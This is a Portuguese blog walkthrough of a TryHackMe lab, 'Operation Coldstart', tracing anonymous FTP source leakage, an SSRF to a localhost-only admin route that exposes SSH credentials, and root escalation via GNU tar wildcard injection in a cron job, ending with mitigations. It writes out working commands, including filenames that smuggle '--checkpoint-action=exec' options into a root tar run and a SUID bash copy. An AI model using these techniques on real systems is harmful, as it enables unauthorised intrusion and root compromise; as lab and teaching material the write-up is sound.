---
layout: post
title: "Operation Coldstart — SSRF, FTP anônimo e Tar Wildcard Injection até root"
description: "Walkthrough da room Operation Coldstart (TryHackMe): Nmap, Gobuster, backup exposto no FTP, análise de Flask, SSRF para localhost, credenciais via rota admin, SSH e escalação por Cron, GNU tar e Bash SUID."
date: 2026-11-14
categories: [walkthrough]
tags: [linux, tryhackme, operation-coldstart, nmap, gobuster, ftp, flask, gunicorn, ssrf, source-code-disclosure, ssh, cron, tar, wildcard-injection, suid, privilege-escalation, pspy]
---

# Operation Coldstart — SSRF, FTP anônimo e Tar Wildcard Injection até root

Na room **Operation Coldstart**, do **TryHackMe**, a Volt Labs suspeitava que um servidor antigo de *staging* havia se tornado uma superfície de ataque. O objetivo era conseguir acesso à máquina e demonstrar comprometimento total, recuperando `user.txt` e `flag.txt`.

A cadeia começou com um **backup de código-fonte exposto no FTP anônimo**, passou por **SSRF** na aplicação Flask e terminou em **root** por uma tarefa de backup executada via Cron com um wildcard inseguro.

> **Aviso:** este guia documenta um laboratório autorizado e descartável do TryHackMe. IPs e credenciais pertencem à VM da room e podem mudar entre sessões.

## Técnicas utilizadas

| Técnica | Ponto explorado | Resultado |
|---|---|---|
| Reconhecimento e enumeração | Nmap, Gobuster e Burp | Portas 21, 22 e 80; rotas `/preview` e `/admin/` |
| Anonymous FTP / backup exposto | `/pub/backup.tar.gz` | Código-fonte da aplicação |
| Code Review | `app.py` e `README.md` | Host interno permitido e proteção do admin |
| Server-Side Request Forgery (SSRF) | `/preview?url=` | Requisição interna para `kestrel.thm` |
| Sensitive Information Disclosure | `/admin/notes` | Credenciais SSH de `webdev` |
| SSH com credencial descoberta | Porta 22 | Shell como `webdev` e `user.txt` |
| Cron Job Abuse + Tar Wildcard Injection | `/etc/cron.d/voltlabs-backup` | Execução de script como root |
| SUID Privilege Escalation | Cópia do `/bin/bash` | `euid=0(root)` e `flag.txt` |

## Índice

1. [Ambiente e cadeia de exploração](#ambiente)
2. [Nmap, Gobuster e análise HTTP](#recon)
3. [Backup exposto por FTP anônimo](#ftp)
4. [Código-fonte e funcionamento da SSRF](#codigo)
5. [SSRF para a rota administrativa](#ssrf)
6. [SSH como webdev e user.txt](#ssh)
7. [Enumeração manual, LinPEAS, LinEnum e pspy](#enumeracao)
8. [Cron Abuse: Tar Wildcard Injection](#cron)
9. [Bash SUID, root e flag.txt](#root)
10. [Erros, debrief e mitigações](#licoes)
11. [Referências e posts relacionados](#referencias)

<a id="ambiente"></a>

## 1. Ambiente e cadeia de exploração

| Item | Valor no meu laboratório |
|---|---|
| AttackBox | `10.67.102.91` |
| Alvo | `10.67.184.94` |
| Hostname | `coldstart` |
| Serviços | FTP 21, SSH 22 e HTTP 80 |
| Aplicação | Flask servida por Gunicorn |
| Usuário inicial | `webdev` (UID 1001) |
| Diretório controlado pelo usuário | `/opt/backups` |
| Objetivo final | `euid=0(root)` |

~~~text
AttackBox
   |
   +-- Nmap + Gobuster
   |       |
   |       +-- FTP anonymous --> /pub/backup.tar.gz --> app.py
   |       |                                           |
   |       +-- HTTP /preview?url= ---------------------+
   |                      |
   |               host permitido: kestrel.thm
   |               /etc/hosts do alvo -> 127.0.0.1
   |                      |
   |              SSRF -> /admin/notes
   |                      |
   |              credencial webdev
   |                      |
   +-----------------> SSH webdev --> user.txt
                          |
                    enumeração Linux
                          |
             /opt/backups gravável por webdev
             /etc/cron.d/voltlabs-backup (root)
                          |
                GNU tar com wildcard *
                          |
             --checkpoint-action=exec=...
                          |
               script executado como root
                          |
                 cópia do Bash SUID
                          |
                    euid=0(root)
                          |
                      flag.txt
~~~

<a id="recon"></a>

## 2. Reconhecimento: Nmap, Gobuster e Burp

Primeiro confirmei que o host respondia a ICMP com `ping 10.67.184.94`. Depois executei:

**Comando usado:**

~~~bash
nmap -sV -sC 10.67.184.94
~~~

- `-sV`: identifica serviços e versões.
- `-sC`: executa o conjunto padrão de scripts NSE.

Resultado relevante:

~~~text
21/tcp open  ftp  vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x 2 ftp ftp 4096 May 09 2026 pub

22/tcp open  ssh  OpenSSH 9.6p1 Ubuntu

80/tcp open  http gunicorn
| http-title: URL Preview - Volt Labs
~~~

O Nmap examinou as **portas TCP padrão**, não todas as 65.535. O script `ftp-anon` já mostrou uma pista importante: era possível acessar o FTP sem conta específica.

A página web apresentava um formulário chamado **URL Preview Service**, descrito como ferramenta interna de *staging*. O formulário enviava o parâmetro `url` via GET à rota `/preview`.

Fiz a enumeração de diretórios:

~~~bash
gobuster dir -u http://10.67.184.94/ -w big.txt
~~~

~~~text
/admin    (Status: 308) [--> http://10.67.184.94/admin/]
/preview  (Status: 400)
~~~

O `308` apenas redirecionava `/admin` para `/admin/` (com barra final). Não significava acesso autorizado.

### Testes iniciais no Burp

Uma requisição sem valor de `url` retornou:

~~~http
GET /preview?url= HTTP/1.1
Host: 10.67.184.94

HTTP/1.1 400 BAD REQUEST
~~~

Mensagem: `Provide a ?url= parameter.`

Tentei uma hipótese de *path traversal*:

~~~http
GET /preview?url=/../../../etc/ HTTP/1.1
Host: 10.67.184.94
~~~

A resposta foi `403 Forbidden` com a mensagem:

~~~text
Host not in the approved internal allow-list.
~~~

Aqui estava a primeira lição: **esse 403 não prova que o servidor identificou e bloqueou `../`**. A aplicação esperava uma **URL com hostname**, e eu havia enviado apenas um caminho local. Posteriormente, o código-fonte confirmou que a rejeição ocorreu na validação do hostname.

Também tentei um servidor HTTP/HTTPS no AttackBox para verificar conexões de retorno. Confundi inicialmente a porta `8080`, usada como proxy do Burp, com a porta do `python3 -m http.server`. O log do Python mostrou `127.0.0.1` enviando uma requisição no formato de proxy para a própria aplicação: **não era evidência de SSRF originada no alvo**. Mudei o servidor para a porta `9000`, mas a aplicação continuou bloqueando meu IP por não estar na lista de hosts permitidos.

> **Nota:** trocar HTTP por HTTPS ou criar um certificado autoassinado não resolve uma rejeição de hostname. Antes de variar payloads, vale entender **qual validação falhou**.

<a id="ftp"></a>

## 3. FTP anônimo: recuperando o backup

Como o Nmap encontrou acesso anônimo, conectei ao FTP:

~~~bash
ftp 10.67.184.94
~~~

Informei `anonymous` como usuário e pressionei Enter para a senha.

~~~text
230 Login successful.
ftp> ls -la
drwxr-xr-x 2 ftp ftp 4096 May 09 2026 pub

ftp> cd pub
ftp> ls -la
-rw-r--r-- 1 ftp ftp 2446 May 09 2026 backup.tar.gz

ftp> get backup.tar.gz
226 Transfer complete.
~~~

Na AttackBox, extraí o arquivo e examinei o conteúdo:

~~~bash
mkdir -p ~/backupcold
mv backup.tar.gz ~/backupcold/
cd ~/backupcold
tar -xzf backup.tar.gz
ls -la voltlabs-preview
cat voltlabs-preview/README.md
cat voltlabs-preview/requirements.txt
cat voltlabs-preview/app.py
~~~

Arquivos encontrados:

~~~text
voltlabs-preview/
├── README.md
├── app.py
└── requirements.txt
~~~

O `requirements.txt` continha:

~~~text
flask
requests
gunicorn
~~~

**Flask** é o framework web Python; **Gunicorn** é o servidor que publica a aplicação. O banner `Server: gunicorn`, sozinho, não identifica necessariamente o framework usado pelo código.

No `README.md` encontrei:

~~~text
Internal staging tool. Run with gunicorn -b 0.0.0.0:80 app:app.
Admin routes are gated by source-IP check (localhost only).
~~~

Ou seja: a aplicação tinha rotas administrativas acessíveis somente a partir do **localhost**.

<a id="codigo"></a>

## 4. Analisando o app.py: por que a SSRF era possível?

O código-fonte revelou exatamente o que a aplicação considerava um destino permitido:

~~~python
# Internal hostname resolves to 127.0.0.1 via /etc/hosts on this box.
ALLOWED_HOSTS = {"kestrel.thm"}
~~~

Na função `preview()`, os trechos importantes eram:

~~~python
target = request.args.get("url", "")
host = (urlparse(target).hostname or "").lower()

if host not in ALLOWED_HOSTS:
    return page("Preview Blocked",
                '<div class="card"><p>Host not in the approved internal allow-list.</p></div>'), 403

try:
    r = requests.get(target, timeout=3)
    safe_body = r.text.replace("<", "&lt;")
    # Exibe a resposta da URL buscada na página
~~~

**Fluxo do código:**

1. `request.args.get("url", "")` lê a entrada recebida na query string.
2. `urlparse(target).hostname` extrai o hostname, e `.lower()` normaliza maiúsculas/minúsculas.
3. A aplicação verifica se o hostname está em `ALLOWED_HOSTS`.
4. Se estiver, `requests.get(target)` faz **uma nova requisição HTTP a partir do próprio servidor**.
5. O texto da resposta é colocado dentro da página de preview.

O comentário do próprio código indicava a deficiência: só havia uma validação de hostname, sem restrição de caminho ou checagem efetiva do endereço de loopback. **Não precisei de DNS rebinding**: `kestrel.thm` já era um nome aprovado que apontava para `127.0.0.1` na máquina alvo.

Outra parte do `app.py` explicou a proteção administrativa:

~~~python
@app.route("/admin/")
@app.route("/admin/<path:p>")
def admin(p="index"):
    if not request.remote_addr.startswith("127."):
        abort(403)
    if p == "notes":
        with open("/opt/voltlabs-preview/admin_notes.txt") as f:
            return "<pre>" + f.read() + "</pre>"
    return "<pre>Volt Labs admin endpoint.</pre>"
~~~

A aplicação negava acesso a `/admin/` quando o IP **de origem da conexão** não começava com `127.`. Mas a requisição disparada pela função `preview()` saía do próprio servidor e chegava à aplicação via loopback.

<a id="ssrf"></a>

## 5. SSRF: de /preview até /admin/notes

No Burp e no navegador, enviei o host autorizado como destino da URL:

~~~text
http://kestrel.thm/
~~~

O `/preview` retornou a própria página inicial da Volt Labs. Em seguida, acessei a rota administrativa:

~~~http
GET /preview?url=http%3A%2F%2Fkestrel.thm%2Fadmin HTTP/1.1
Host: 10.67.184.94
~~~

Resposta exibida:

~~~text
Preview of http://kestrel.thm/admin

<pre>Volt Labs admin endpoint.</pre>
~~~

**SSRF confirmada:** consegui visualizar a rota interna que normalmente exigia origem `127.0.0.1`.

O próximo alvo era o arquivo revelado no código:

~~~text
/opt/voltlabs-preview/admin_notes.txt
~~~

Inicialmente tentei passar esse caminho diretamente na URL e recebi `404`. O motivo é simples: **um caminho no sistema de arquivos Linux não é automaticamente uma rota HTTP**.

O código dizia:

~~~python
if p == "notes":
    with open("/opt/voltlabs-preview/admin_notes.txt") as f:
~~~

Portanto, eu precisava chamar **`/admin/notes`**, fazendo o próprio Flask abrir o arquivo.

**Comando usado:**

~~~bash
curl -sG \
  --data-urlencode 'url=http://kestrel.thm/admin/notes' \
  http://10.67.184.94/preview
~~~

Ou pela URL:

~~~text
http://<target>/preview?url=http%3A%2F%2Fkestrel.thm%2Fadmin%2Fnotes
~~~

Resultado:

~~~text
Preview of http://kestrel.thm/admin/notes

=== INTERNAL ===
SSH access for staging:
  user: webdev
  pass: V0ltLabs#summer
- Mara
~~~

Aqui tivemos **Sensitive Information Disclosure** por SSRF. A conta e a senha estavam guardadas em um arquivo interno e foram expostas por uma funcionalidade administrativa protegida apenas pela origem IP.

> **SSRF não é LFI.** Eu não fiz o servidor interpretar `/opt/...` como um arquivo via parâmetro `url`. Usei SSRF para chamar uma rota legítima que, por sua vez, lia o arquivo em disco.

<a id="ssh"></a>

## 6. SSH como webdev — user.txt

Com a credencial recuperada, acessei o serviço SSH:

~~~bash
ssh webdev@10.67.184.94
~~~

Usei a senha indicada nas notas administrativas.

~~~bash
whoami
id
pwd
sudo -l
~~~

~~~text
webdev
uid=1001(webdev) gid=1001(webdev) groups=1001(webdev)
/home/webdev
Sorry, user webdev may not run sudo on coldstart.
~~~

O usuário não tinha autorização para executar `sudo`. A flag estava na home:

~~~bash
ls -la ~
cat ~/user.txt
~~~

~~~text
THM{96dc7bd50d2fb98fcece01560788b5ab}
~~~

**Primeiro objetivo concluído.** Faltava encontrar a forma de elevar os privilégios.

<a id="enumeracao"></a>

## 7. Enumeração Linux: manual, LinPEAS, LinEnum e pspy

Comecei buscando usuários interativos, grupos, SUID, capabilities e arquivos graváveis.

**Comandos usados:**

~~~bash
awk -F: '$7 ~ /\/(bash|sh|zsh)$/ {print $1, $6, $7}' /etc/passwd
getent group
id
ls -la /home
sudo -l

find / -type f -user root -perm -4000 -printf '%p\n' 2>/dev/null | grep -v '^/snap/'
getcap -r / 2>/dev/null
find /opt /usr/local/bin /home -type f -writable -printf '%p\n' 2>/dev/null
~~~

Identifiquei os usuários `root`, `ubuntu` e `webdev` com shell; `webdev` tinha somente seu grupo próprio. Os binários SUID e as capabilities encontrados não indicavam imediatamente uma rota personalizada de escalação.

A busca por **arquivos** graváveis encontrou `/opt/backups/.keep`, mas isso não mostrava todas as permissões do **diretório**. Investiguei:

~~~bash
ls -ld /opt /opt/backups
ls -la /opt/backups
ls -la /var/backups
~~~

~~~text
drwxr-xr-x root   root   /opt
drwxrwx--- webdev webdev /opt/backups

/opt/backups:
-rw-r--r-- webdev webdev .keep

/var/backups:
-rw-r--r-- root root uploads.tgz
~~~

O `770` em `/opt/backups` era importante: o proprietário `webdev` tinha **rwx** no diretório, portanto podia criar e remover entradas nele, inclusive arquivos com nomes incomuns.

> **Dica de permissão:** em diretórios, `w` permite alterar entradas e `x` permite atravessá-lo. Um `find -type f -writable` sozinho pode deixar passar diretórios graváveis, justamente o detalhe que importava aqui.

### 7.1 Cron e timers

~~~bash
cat /etc/crontab
ls -la /etc/cron*
systemctl list-timers --all
~~~

Entre as tarefas padrão apareceu uma personalizada:

~~~text
/etc/cron.d/voltlabs-backup
~~~

Não era necessário tentar uma CVE de kernel ou forçar `sudo`. O Cron fornecia uma pista bem mais concreta.

### 7.2 Transferir as ferramentas com SCP

Copiei as ferramentas da AttackBox para o alvo pelo SSH:

~~~bash
scp linpeas.sh webdev@<target>:/tmp/
scp LinEnum.sh webdev@<target>:/tmp/
scp pspy64 webdev@<target>:/tmp/
~~~

`scp` usa SSH para transferência de arquivos: não é necessário abrir outro servidor HTTP. Para copiar arquivos do alvo de volta para a AttackBox, a direção se inverte: `scp webdev@<target>:/caminho/arquivo .`.

Executei os scripts e salvei a saída:

~~~bash
bash /tmp/linpeas.sh > ~/linpeas-output.txt 2>&1
bash /tmp/LinEnum.sh > ~/linenum-output.txt 2>&1
~~~

- `>` grava a saída padrão no arquivo.
- `2>&1` redireciona também os erros para o mesmo arquivo.
- `grep -Ein` ajuda a buscar termos com número da linha.

Filtros úteis:

~~~bash
grep -Ein 'cron|backup|writable|suid|sudo|password|credential' \
  ~/linpeas-output.txt | head -n 100

grep -in -A 10 -B 5 'backup' ~/linenum-output.txt
~~~

No início, tentei executar `pspy64` usando `bash /tmp/pspy64`, mas ele é um **binário ELF**, não um script. A forma correta é:

~~~bash
chmod +x /tmp/pspy64
/tmp/pspy64 -pf -i 1000 | tee ~/pspy64-output.txt
~~~

O `pspy` acompanha processos e eventos de arquivos sem exigir root. Ele ajuda a confirmar tarefas que executam rapidamente, como scripts do Cron. Aqui, o arquivo de configuração já expunha o comando da tarefa; o `pspy` era um complemento, não a única evidência.

<a id="cron"></a>

## 8. Cron Abuse: Tar Wildcard Injection

**Este foi o ponto decisivo da escalação.**

O arquivo `/etc/cron.d/voltlabs-backup` continha:

~~~cron
# Volt Labs staging backup - runs as root
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

* * * * * root cd /opt/backups && tar czf /var/backups/uploads.tgz *
~~~

A tarefa executava **a cada minuto como root**, entrava em `/opt/backups` e criava um arquivo compactado em `/var/backups/uploads.tgz`.

### 8.1 Por que o asterisco era perigoso?

O `*` é expandido pelo shell para os nomes de arquivos não ocultos no diretório atual.

Se houvesse apenas:

~~~text
arquivo1.txt
arquivo2.txt
~~~

O comando acabaria equivalente a:

~~~bash
tar czf /var/backups/uploads.tgz arquivo1.txt arquivo2.txt
~~~

Mas o diretório era **gravável pelo webdev**. Se eu criasse arquivos cujos nomes começassem com opções do `tar`, o shell também os colocaria no comando.

As opções relevantes do GNU tar são:

~~~text
--checkpoint=1
--checkpoint-action=exec=COMANDO
~~~

- `--checkpoint=1` ativa checkpoints frequentes durante o processamento do arquivo.
- `--checkpoint-action=exec=...` instrui o GNU tar a executar um comando em um checkpoint.

Por exemplo, nomes maliciosos como:

~~~text
--checkpoint=1
--checkpoint-action=exec=sh coldstart-root.sh
~~~

Fazem o `tar` receber **opções reais** depois que o Bash expande o `*`. Ele não entende que aqueles argumentos vieram originalmente de nomes de arquivos.

**Ponto importante:** não modifiquei o Cron nem um script de propriedade do root. Meu controle era sobre os **nomes dos arquivos passados como argumentos** ao programa privilegiado.

### 8.2 Preparando o script

Primeiro criei um script simples em `/tmp`:

~~~bash
cat > /tmp/coldstart-root.sh <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/coldstart-rootbash
chmod 4755 /tmp/coldstart-rootbash
EOF
~~~

O que ele faz:

1. `cp /bin/bash /tmp/coldstart-rootbash`: copia o executável do Bash.
2. `chmod 4755`: define permissões `rwxr-xr-x` com **SUID** ativado.

Como o objetivo era fazer o **root executar o script**, a cópia gerada teria `root` como proprietário.

### 8.3 Criando os arquivos para injetar opções

Minha primeira tentativa falhou:

~~~bash
touch -- '--checkpoint-action=exec=sh /tmp/coldstart-root.sh'
~~~

~~~text
touch: cannot touch '--checkpoint-action=exec=sh /tmp/coldstart-root.sh':
No such file or directory
~~~

**Por quê?** Uma barra `/` dentro do nome continua sendo separador de diretórios Linux, mesmo entre aspas. Não é possível ter um arquivo simples com `/tmp/...` embutido no próprio nome.

Corrigi usando **um caminho relativo**, já que a tarefa executava `cd /opt/backups`:

~~~bash
cp /tmp/coldstart-root.sh /opt/backups/coldstart-root.sh
cd /opt/backups

touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh coldstart-root.sh'
touch arquivo.txt
ls -lb
~~~

Resultado:

~~~text
-rw-rw-r-- webdev webdev  0 --checkpoint-action=exec=sh\ coldstart-root.sh
-rw-rw-r-- webdev webdev  0 --checkpoint=1
-rw-rw-r-- webdev webdev  0 arquivo.txt
-rw-rw-r-- webdev webdev 82 coldstart-root.sh
~~~

Aqui, `touch --` usa `--` para avisar ao **touch** que os próximos valores são nomes de arquivos, mesmo começando com hífen. Já `ls -b` escapa caracteres especiais na exibição: `\ ` representa o espaço presente no nome.

O Cron, porém, chamava `tar ... *` sem delimitar com segurança os nomes dos arquivos. Quando o wildcard era expandido, o GNU tar interpretava os dois nomes como opções.

O arquivo `arquivo.txt` servia como conteúdo comum para o backup. O `.keep` original começava com ponto; por padrão, `*` no Bash **não inclui arquivos ocultos**, o que explicava o backup praticamente vazio antes da exploração.

### 8.4 Quem efetivamente executou os comandos?

Essa distinção é essencial:

~~~text
webdev
  |
  +-- cria coldstart-root.sh e nomes --checkpoint*
  |
Cron (root) -> tar czf ... *
                     |
                     +-- tar interpreta --checkpoint-action
                     |
                     +-- executa: sh coldstart-root.sh (root)
                                            |
                                            +-- cp /bin/bash /tmp/coldstart-rootbash
                                            +-- chmod 4755 /tmp/coldstart-rootbash
~~~

**Foi o root quem executou `cp` e `chmod`.** O usuário `webdev` escreveu o conteúdo que seria executado, mas não tinha poderes para criar por conta própria um executável SUID de propriedade do root.

<a id="root"></a>

## 9. Bash SUID: de webdev até root — flag.txt

Após a execução seguinte da tarefa agendada, conferi:

~~~bash
ls -l /tmp/coldstart-rootbash
~~~

Resultado real:

~~~text
-rwsr-xr-x 1 root root 1446024 Nov 14 13:06 /tmp/coldstart-rootbash
~~~

O `s` em `-rwsr-xr-x` indica que o bit **SUID** está ativo.

### 9.1 O que são UID e EUID?

- **UID (real)**: identidade original do processo, aqui `webdev` (1001).
- **EUID (efetivo)**: identidade que o sistema usa nas verificações de acesso; com SUID, pode assumir a do proprietário do arquivo executado.

O comando `chmod 4755` adicionou o bit SUID (`4000`) às permissões `755`. Como o Bash copiado pertencia ao **root**, executá-lo permitiu obter EUID 0. O parâmetro `-p` do Bash preservou esse privilégio.

**Comando usado:**

~~~bash
/tmp/coldstart-rootbash -p
id
~~~

~~~text
uid=1001(webdev) gid=1001(webdev) euid=0(root) groups=1001(webdev)
~~~

Repare que **o UID real continuou 1001**, mas o EUID passou a **0**. O `-p` foi importante para o Bash não descartar os privilégios efetivos.

A flag final estava em:

~~~bash
cat /root/flag.txt
~~~

~~~text
THM{e6ee84a483d67ade06936fcfd1433e8a}
~~~

**Root confirmado.** Essa técnica depende de condições do ambiente, como a cópia SUID estar em um sistema de arquivos que permita SUID (sem `nosuid`).

<a id="licoes"></a>

## 10. O que aprendi, debrief e mitigações

### Erros e observações do laboratório

| Situação | O que ocorreu | Aprendizado |
|---|---|---|
| `/preview?url=` vazio | `400` | Validar formato da entrada antes de explorar |
| `?url=/../../../etc/` | `403`, allow-list | A falha era ausência de hostname permitido, não prova de bloqueio de traversal |
| Servidor Python na porta 8080 | Conflito com proxy Burp | Verificar se o tráfego observado realmente veio do alvo |
| HTTP/HTTPS para minha AttackBox | Host rejeitado | O código só aceitava `kestrel.thm` |
| `kestrel.thm/opt/...` | `404` | Rota HTTP é diferente de caminho local |
| `kestrel.thm/admin/notes` | Notas e credenciais | A rota chamava `open()` internamente |
| `sudo -l` | Negado | Não insistir em sudo sem evidência |
| `bash /tmp/pspy64` | Execução incorreta | Binário ELF deve ser executado diretamente |
| `touch` com `/tmp/...` no nome | Erro de caminho | Barra é separador, não caractere válido em nome simples |
| `tar` com `*` em diretório controlado | Execução como root | Não passar nomes de arquivos não confiáveis como opções |

### Sobre o debrief do TryHackMe

O feedback automático sugeriu testar variações de traversal, incluindo **URL encoding**, dupla codificação e outros arquivos, após receber `403`.

É uma recomendação válida como **método geral de enumeração**: uma tentativa bloqueada não encerra a investigação. Entretanto, **nesta room** o `app.py` explicou por que aquele teste específico não funcionou: `urlparse(target).hostname` era vazio para `/../../../etc/`, e o bloqueio veio da **allow-list de hosts**.

Testar mais variantes desse mesmo caminho **sem fornecer um hostname autorizado** não resolveria a condição observada. A evolução mais produtiva foi ler o código do backup e explorar um caminho realmente aceito pela aplicação.

### Medidas de segurança

**No FTP:** não expor backups e código-fonte por acesso anônimo. O vazamento do `app.py` facilitou entender a lógica de validação e os caminhos administrativos.

**Na aplicação web:** não confiar apenas em allow-list textual de hostname para SSRF. Validar esquemas, portas e caminhos necessários; resolver e verificar endereços contra faixas internas/loopback; controlar redirecionamentos e aplicar isolamento de rede. Uma rota administrativa não deve depender **apenas** de `request.remote_addr` para autenticação.

**Nas credenciais:** não armazenar senhas SSH em notas acessíveis por uma rota web. Usar gestão de segredos, menor privilégio e controles de acesso independentes.

**No Cron e no tar:** não usar `*` para passar nomes potencialmente controlados por usuários a um comando privilegiado. Uma forma mais segura de arquivar o diretório inteiro, incluindo arquivos ocultos, sem interpretar nomes individuais como opções é:

~~~bash
tar -czf /var/backups/uploads.tgz -C /opt/backups -- .
~~~

Nesse caso, o `tar` recebe o argumento literal `.`, e não uma expansão de nomes começando com `--`. Também é importante evitar que processos privilegiados confiem sem necessidade em conteúdo controlado por usuários comuns.

> **Dica final:** a room mostrou dois erros diferentes de confiança: no web, confiar no IP de origem como autorização; no Linux, confiar nos nomes de arquivos ao montar argumentos para um comando executado como root. Em ambos os casos, dados controlados em um contexto menos privilegiado atravessaram uma barreira de segurança.

<a id="referencias"></a>

## 11. Referências e posts relacionados

- [Linux Privilege Escalation — Cron, SUID e LD_PRELOAD](https://redp4w.github.io/notes/linux-cron-suid-ld-preload/) — comparação: Cron executando diretamente um script gravável por outro usuário.
- [NexusCorp — Do Recon ao Root](https://redp4w.github.io/notes/nexuscorp-do-recon-ao-root/) — outra cadeia de comprometimento com Cron e Bash SUID.
- [Silent Monitor — SQLi, Command Injection e KeePass até root](https://redp4w.github.io/notes/silent-monitor-sqli-command-injection-keepass-root/) — exposição de credenciais e privilege escalation por outro caminho.
- [PortSwigger Web Security Academy — SSRF](https://portswigger.net/web-security/ssrf) — exemplos e defesas contra SSRF.
- [GNU tar Manual — Checkpoints](https://www.gnu.org/software/tar/manual/tar.html) — documentação de `--checkpoint` e `--checkpoint-action=exec`.
- [GTFOBins — tar](https://gtfobins.github.io/gtfobins/tar/) — capacidades do tar em situações de abuso.
- [MITRE ATT&CK — T1053.003 (Cron)](https://attack.mitre.org/techniques/T1053/003/) — abuso de tarefas agendadas.
- [MITRE ATT&CK — T1548.001 (Setuid and Setgid)](https://attack.mitre.org/techniques/T1548/001/) — abuso de SUID/SGID para elevação de privilégios.
